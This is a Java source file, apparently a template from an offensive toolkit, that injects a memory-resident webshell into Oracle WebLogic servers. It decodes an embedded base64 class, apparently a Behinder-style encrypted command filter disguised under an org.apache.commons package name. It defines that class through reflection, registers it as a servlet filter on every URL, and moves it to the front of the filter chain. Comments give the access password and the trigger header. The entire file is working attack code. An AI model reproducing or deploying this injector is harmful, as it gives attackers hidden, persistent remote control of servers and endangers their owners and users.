package com.feihong.template;

import sun.misc.BASE64Decoder;
import weblogic.servlet.internal.FilterManager;
import weblogic.servlet.internal.ServletRequestImpl;
import weblogic.servlet.internal.WebAppServletContext;
import weblogic.servlet.utils.ServletMapping;
import weblogic.utils.collections.MatchMap;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Map;

/*
   密码: Wnmqhliiv
   地址: /*
   请求头: Referer: Ljiiba
   脚本类型: JSP
   内存马类名: org.apache.commons.ServletContextMwFilter
   注入器类名: org.apache.logging.tystxv.SOAPUtils
 */

public class WeblogicMemshellTemplate2 {
    private ServletRequestImpl servletRequest;
    private String filterName = "dynamicFilter";
    private String urlPattern = "/*";

    public WeblogicMemshellTemplate2(ServletRequestImpl servletRequest){
        this.servletRequest = servletRequest;
        addMemshell();
    }

    private void addMemshell(){
        try {
            Field contextField = servletRequest.getClass().getDeclaredField("context");
            contextField.setAccessible(true);
            WebAppServletContext servletContext = (WebAppServletContext) contextField.get(servletRequest);
            FilterManager filterManager = servletContext.getFilterManager();

            // 判断一下，防止多次加载， 默认只加载一次，不需要重复加载
            if (!filterManager.isFilterRegistered(filterName)) {
                System.out.println("[+] Add Dynamic Filter");

                ClassLoader cl = Thread.currentThread().getContextClassLoader();
                Class clazz;
                try{
                    clazz = cl.loadClass("org.apache.commons.ServletContextMwFilter");
                }catch(ClassNotFoundException e){
                    BASE64Decoder base64Decoder = new BASE64Decoder();
                    String codeClass = "yv66vgAAADEBAQEAKW9yZy9hcGFjaGUvY29tbW9ucy9TZXJ2bGV0Q29udGV4dE13RmlsdGVyBwABAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyBwADAQAUamF2YXgvc2VydmxldC9GaWx0ZXIHAAUBAA1nZXRIZWFkZXJOYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAARDb2RlAQAHUmVmZXJlcggACgEADmdldEhlYWRlclZhbHVlAQAGTGppaWJhCAANAQAPaW5pdEN1c3RvbVBhcmFtAQADKClWAQAQZWYwZTMzYTk1NTY5ODRiOAgAEQEABHBhc3MBABJMamF2YS9sYW5nL1N0cmluZzsMABMAFAkAAgAVAQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACtMb3JnL2FwYWNoZS9jb21tb25zL1NlcnZsZXRDb250ZXh0TXdGaWx0ZXI7AQABYgEAAltCAQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwwAHwAgCgAEACEBAAY8aW5pdD4MACMAEAoABAAkAQAaKExqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAAFjAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsMACMAJgoABAApAQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7AQAKRXhjZXB0aW9ucwEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgcAMAEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEAE2phdmEvbGFuZy9FeGNlcHRpb24HADQBAAdzZXNzaW9uAQAgTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAANvYmoBAA9MamF2YS91dGlsL01hcDsBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAtoZWFkZXJWYWx1ZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0BwBIAQAQamF2YS9sYW5nL1N0cmluZwcASgEADVN0YWNrTWFwVGFibGUMAAcACAoAAgBNAQAJZ2V0SGVhZGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMAE8AUAsASQBRDAAMAAgKAAIAUwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDABVAFYKAEsAVwEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247DABZAFoLAEkAWwEAFmdldFJlc3BvbnNlRnJvbVJlcXVlc3QBAFEoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7KUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsMAF0AXgoAAgBfAQARamF2YS91dGlsL0hhc2hNYXAHAGEKAGIAJAgARgEADWphdmEvdXRpbC9NYXAHAGUBAANwdXQBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAZwBoCwBmAGkIADgIADYBAAF1CABtAQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uBwBvAQAIcHV0VmFsdWUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYMAHEAcgsAcABzAQADQUVTCAB1AQATamF2YXgvY3J5cHRvL0NpcGhlcgcAdwEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsMAHkAegoAeAB7AQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwcAfQEACGdldEJ5dGVzAQAEKClbQgwAfwCACgBLAIEBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgwAIwCDCgB+AIQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgwAKwCGCgB4AIcBABBqYXZhL2xhbmcvT2JqZWN0BwCJAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7DACLAIwKAIoAjQEAD2phdmEvbGFuZy9DbGFzcwcAjwEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwwAkQCSCgCQAJMKAAIAKQEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QHAJYBAAlnZXRSZWFkZXIBABooKUxqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwwAmACZCwCXAJoBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyBwCcAQAIcmVhZExpbmUMAJ4ACAoAnQCfAQAOZG9CYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCDAChAKIKAAIAowEAB2RvRmluYWwBAAYoW0IpW0IMAKUApgoAeACnDAAXABgKAAIAqQEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsMAKsArAoAkACtAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaDACvALAKAIoAsQEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4HALMBAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWDAAyALULALQAtgEAE2phdmEvaW8vSU9FeGNlcHRpb24HALgBAAVnZXRGVgEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7DAC6ALsKAAIAvAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlBwC+AQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uBwDAAQAEdmFyNQEAIExqYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb247AQAEdmFyMAEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABHZhcjEBAAR2YXIyAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABHZhcjMBABFMamF2YS9sYW5nL0NsYXNzOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkBwDLAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwAzQDOCgCQAM8BAA1nZXRTdXBlcmNsYXNzDADRAIwKAJAA0gEAFShMamF2YS9sYW5nL1N0cmluZzspVgwAIwDUCgDBANUBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwA1wDYCgDMANkBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwA2wDcCgDMAN0BAAVjbGF6egEAB2RlY29kZXIBAANzdHIBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyCADiAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsMAOQA5QoAkADmAQAMZGVjb2RlQnVmZmVyCADoAQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwwA6gDrCgCQAOwBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHAO4BAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAPAA8QoA7wDyBwAeAQAQamF2YS51dGlsLkJhc2U2NAgA9QEACmdldERlY29kZXIIAPcBAAZkZWNvZGUIAPkB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";
                    byte[] bytes = base64Decoder.decodeBuffer(codeClass);

                    Method method = null;
                    Class clz = cl.getClass();
                    while(method == null && clz != Object.class ){
                        try{
                            method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                        }catch(NoSuchMethodException ex){
                            clz = clz.getSuperclass();
                        }
                    }
                    method.setAccessible(true);
                    clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);
                }

                //将 Filter 注册进 FilterManager
                //参数： String filterName, String filterClassName, String[] urlPatterns, String[] servletNames, Map initParams, String[] dispatchers
                Method registerFilterMethod = filterManager.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, Map.class, String[].class);
                registerFilterMethod.setAccessible(true);
                registerFilterMethod.invoke(filterManager, filterName, "org.apache.commons.ServletContextMwFilter", new String[]{urlPattern}, null, null, null);


                //将我们添加的 Filter 移动到 FilterChian 的第一位
                Field filterPatternListField = filterManager.getClass().getDeclaredField("filterPatternList");
                filterPatternListField.setAccessible(true);
                ArrayList filterPatternList = (ArrayList)filterPatternListField.get(filterManager);


                //不能用 filterName 来判断，因为在 11g 中此值为空，在 12g 中正常
                for(int i = 0; i < filterPatternList.size(); i++){
                    Object filterPattern = filterPatternList.get(i);
                    Field f = filterPattern.getClass().getDeclaredField("map");
                    f.setAccessible(true);
                    ServletMapping mapping = (ServletMapping) f.get(filterPattern);

                    f = mapping.getClass().getSuperclass().getDeclaredField("matchMap");
                    f.setAccessible(true);
                    MatchMap matchMap = (MatchMap)f.get(mapping);

                    Object result = matchMap.match(urlPattern);
                    if(result != null && result.toString().contains(urlPattern)){
                        Object temp = filterPattern;
                        filterPatternList.set(i, filterPatternList.get(0));
                        filterPatternList.set(0, temp);
                        break;
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
